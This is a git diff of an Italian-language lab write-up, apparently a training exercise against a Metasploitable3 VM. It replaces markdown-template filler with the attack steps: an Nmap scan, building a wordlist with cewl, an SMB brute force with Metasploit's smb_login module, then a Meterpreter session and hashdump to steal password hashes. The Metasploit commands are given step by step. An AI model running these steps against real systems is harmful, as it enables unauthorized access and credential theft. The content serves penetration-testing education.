@@ -8,9 +8,9 @@ L'attacco è stato eseguito seguendo diverse fasi chiave:
 
 1)**Scansione Iniziale della Rete**: In questa fase, abbiamo eseguito una scansione degli indirizzi IP della rete utilizzando strumenti come Nmap. L'obiettivo era identificare le macchine attive e raccogliere informazioni sui sistemi operativi in esecuzione e sui servizi disponibili.
 
-2)**Sfruttamento della Porta 445**: Identificata una macchina con la porta 445 aperta, abbiamo sfruttato un exploit noto per ottenere le password locali del sistema. Questo è stato realizzato attraverso un attacco di forza bruta e l'utilizzo di un dizionario di password.
+2)**Exploit della Porta 445**: Identificata una macchina con la porta 445 aperta, abbiamo sfruttato un exploit noto per ottenere le password locali del sistema. Questo è stato realizzato attraverso un attacco di forza bruta e l'utilizzo di un dizionario di password.
 
-3)**Esecuzione di Comandi** da Remoto: Utilizzando le credenziali ottenute, abbiamo sfruttato un altro exploit per eseguire comandi da remoto e aprire una sessione Meterpreter, un potente payload di Metasploit che ci ha fornito accesso remoto al sistema.
+3)**Esecuzione di Comandi da Remoto**: Utilizzando le credenziali ottenute, abbiamo sfruttato un altro exploit per eseguire comandi da remoto e aprire una sessione Meterpreter, un potente payload di Metasploit che ci ha fornito accesso remoto al sistema.
 
 4)**Raccolta di Hash delle Password**: Una volta ottenuto l'accesso, abbiamo utilizzato l'estensione hashdump di Meterpreter per rubare gli hash delle password locali del sistema.
 
@@ -22,17 +22,17 @@ L'attacco è stato eseguito seguendo diverse fasi chiave:
 
 ### a)Identificazione dell'Indirizzo IP e della Netmask
 + Aprire il terminale sulla macchina attaccante (Kali Linux).
-+ Eseguire il comando **ifconfig** per determinare l'indirizzo IP e la netmask della macchina.
++ Eseguire il comando ```ifconfig``` per determinare l'indirizzo IP e la netmask della macchina.
 + Risultato: L'indirizzo IP è 10.0.2.19 e la netmask è 255.255.255.0.
 
 ### b)Scansione degli Indirizzi IP nella Rete
 + Utilizzare Nmap per identificare le macchine attive nella rete.
-+ Comando: **nmap 10.0.2.0/24**.
++ Comando: ```nmap 10.0.2.0/24```.
 + Risultato: Viene identificato un host attivo con l'indirizzo IP 10.0.2.4.
 
 ### c)Scansione Completa della Macchina Target
 + Utilizzare Nmap per eseguire una scansione completa dell'host identificato.
-+ Comando: **nmap -v -sS -sV -T4 -A 10.0.2.4.**
++ Comando:```nmap -v -sS -sV -T4 -A 10.0.2.4.```
   - v: Modalità verbosa.
   - sS: (SYN stealth scan): esegue una scansione SYN stealth, che è più silenziosa e meno invasiva.
   - T4: Alta velocità di scansione.
@@ -40,93 +40,33 @@ L'attacco è stato eseguito seguendo diverse fasi chiave:
   - sV (version detection): tenta di identificare la versione dei servizi in esecuzione sulle porte aperte
 + Risultato: La scansione fornisce dettagli sui servizi in esecuzione, le versioni, e ulteriori informazioni sul sistema operativo della macchina target.
 
-### Horizontal Rules
+##### Riferimenti
+https://www.redhat.com/sysadmin/quick-nmap-inventory
 
-The HTML `<hr>` element is for creating a "thematic break" between paragraph-level elements. In markdown, you can create a `<hr>` with any of the following:
+### Exploit della porta 445
+Adesso andremo a creare un dizionario che utilizzeremo per i nomi utente e password. Successivamente, utilizzeremo un exploit per tentare il brute force sulla porta 445.
 
-* `___`: three consecutive underscores
-* `---`: three consecutive dashes
-* `***`: three consecutive asterisks
+#### a.Creazione del dizionario
+Utilizza il comando Kali cewl per costruire un nuovo elenco di parole dal contenuto della pagina di configurazione di metasploitable3: 
+```cewl -d 0 -w metasploitable3.txt https://github.com/rapid7/metasploitable3/wiki/Configuration``` (l'opzione -d 0 indica che i collegamenti ipertestuali non devono essere seguiti)
 
-renders to:
+#### b.Esexuzione Exploit
+**1)Aprire Metasploit**: Aprire il terminale e digitare il comando per avviare Metasploit:```msfconsole```.
+**2)Caricare il modulo SMB Login Scanner**: Una volta aperto Metasploit, caricare il modulo per eseguire un attacco brute force sull'SMB (porta 445): ```use auxiliary/scanner/smb/smb_login```.
 
-___
+**3)Impostare l'host bersaglio (RHOSTS)**: Specificare l'indirizzo IP del sistema bersaglio: ```set RHOSTS 10.0.2.4```
 
----
+**4)Impostare il file dei nomi utente**: Specificare il percorso del file che contiene i nomi utente: ```set user_file /home/kali/metasploitable3.txt```.
 
-***
+**5)Impostare il file delle password**: Specificare il percorso del file che contiene le password: ```set pass_file /home/kali/metasploitable3.txt.```
 
-
-### Body Copy
-
-Body copy written as normal, plain text will be wrapped with `<p></p>` tags in the rendered HTML.
-
-So this body copy:
-
-```markdown
-Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.
-```
-renders to this HTML:
-
-```html
-<p>Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.</p>
-```
-
-### Emphasis
-
-#### Bold
-For emphasizing a snippet of text with a heavier font-weight.
-
-The following snippet of text is **rendered as bold text**.
-
-```markdown
-**rendered as bold text**
-```
-renders to:
-
-**rendered as bold text**
-
-and this HTML
-
-```html
-<strong>rendered as bold text</strong>
-```
-
-#### Italics
-For emphasizing a snippet of text with italics.
-
-The following snippet of text is _rendered as italicized text_.
-
-```markdown
-_rendered as italicized text_
-```
-
-renders to:
-
-_rendered as italicized text_
-
-and this HTML:
-
-```html
-<em>rendered as italicized text</em>
-```
+**6)Eseguire l'exploit**: Avviare l'attacco brute force utilizzando il comando: ```exploit```.
 
 
-#### strikethrough
-In GFM (GitHub flavored Markdown) you can do strikethroughs.
+##### Riferimenti:
++ https://www.geeksforgeeks.org/cewl-tool-creating-custom-wordlists-tool-in-kali-linux/
++ https://www.hackingarticles.in/password-crackingsmb/
 
-```markdown
-~~Strike through this text.~~
-```
-Which renders to:
-
-~~Strike through this text.~~
-
-HTML:
-
-```html
-<del>Strike through this text.</del>
-```
 
 ### Blockquotes
 For quoting blocks of content from another source within your document.
